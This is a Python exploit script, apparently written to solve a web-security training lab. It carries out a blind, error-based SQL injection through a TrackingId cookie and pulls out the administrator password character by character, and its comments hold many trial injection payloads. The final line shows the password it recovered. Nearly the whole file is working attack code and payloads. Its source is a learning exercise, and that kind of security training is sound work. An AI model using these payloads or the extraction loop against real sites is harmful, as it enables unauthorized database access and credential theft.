import requests
import string
import time

url = "https://aca61f521f7c8f838024108300aa0019.web-security-academy.net/"


# This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
# The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.
# The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
# To solve the lab, log in as the administrator user. 

session = requests.Session()

response = session.get(url)
cookies = session.cookies.get_dict()

# print (cookies['TrackingId'])
# select 'SrRxuZvQii4iDGOY'='rRxuZvQii4iDGOY' and (select if(1=1,(select username from users where username='administrator'),'0')='1' -- -

# select 'SrRxuZvQii4iDGOY'='SrRxuZvQii4iDGOY' and select if ('a'='a', '1', '0')='1' --
# select 'SrRxuZvQii4iDGOY'='SrRxuZvQii4iDGOY' and (select if ((select username from users where username='administrator')='administrator', 1, 0)=1) --;

# select 'SrRxuZvQii4iDGOY'='SrRxuZvQii4iDGOY' and (select if ((select username from users where username='administrator')='administrator', 1, 0)=1) --


# SrRxuZvQii4iDGOY' and select if ('a'='a', (select 'administrator'),'user')='administrator'
# SrRxuZvQii4iDGOY' and (select if ('a'='a', ('administrator'),'user'))='administrator' -- -
# SrRxuZvQii4iDGOY' and (select if 'a'='a', (select username from users where username='administrator'),'b')='administrator' -- -




tests = [
	# "' or '1'='1",
	# "'||(SELECT '' FROM dual)||'",
	# "'||(SELECT '' FROM users WHERE ROWNUM = 1)||'",
	# "'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
	# "'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
	# "'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'",
	# "'||(SELECT CASE WHEN LENGTH(password)<1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'",
	"'||(SELECT CASE WHEN LENGTH(username)=13 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'",
	# SUBSTR('foobar', 4, 2)
	"'||(SELECT CASE WHEN SUBSTR(username,1,1)='b' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'",

	
	
	
	
]
c = cookies['TrackingId']
# for t in tests:

# 	cookies['TrackingId'] = c + t 
# 	# cookies['TrackingId'] = t 
# 	# print(cookies)
# 	r = requests.get(url, cookies=cookies)
# 	# print(r.text)
# 	if 'Internal Server Error' in r.text:
# 		print (t + " non")


# for i in range(1,30):
# 	t = "'||(SELECT CASE WHEN LENGTH(password)>"+str(i)+" THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
# 	cookies['TrackingId'] = c + t 
# 	r = requests.get(url, cookies=cookies)
# 	if 'Internal Server Error' in r.text:
# 		print (str(i) + " non")
# 	else:
# 		print(i)
# 		break
#20


# cookies['TrackingId'] = "' or (select username from users where username='administrator' limit 1 ) ='administrator"
# cookies['TrackingId'] = "' or (select length(username) from users where username='administrator' limit 1 ) ='13"

# # for x in range(1,30):
# # 	cookies['TrackingId'] = "' or (select length(password) from users where username='administrator' limit 1 ) ='" + str(x)
# # 	# print(cookies)
# # 	r = requests.get(url, cookies=cookies)
# # 	if 'Welcome back!' in r.text:
# # 		print (str(x) + " Yes")
# cookies['TrackingId'] = "' or (select length(password) from users where username='administrator' limit 1 ) ='20"

for x in range(1,21):

	for y in string.printable:
		t = "'||(SELECT CASE WHEN SUBSTR(password,"+str(x)+",1)='"+y+"' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
		cookies['TrackingId'] = c + t 
		r = requests.get(url, cookies=cookies)
		if 'Internal Server Error' in r.text:
			print (y + " yes")
			break
		
	# break;
8hk8lab9o62b0ctcqs48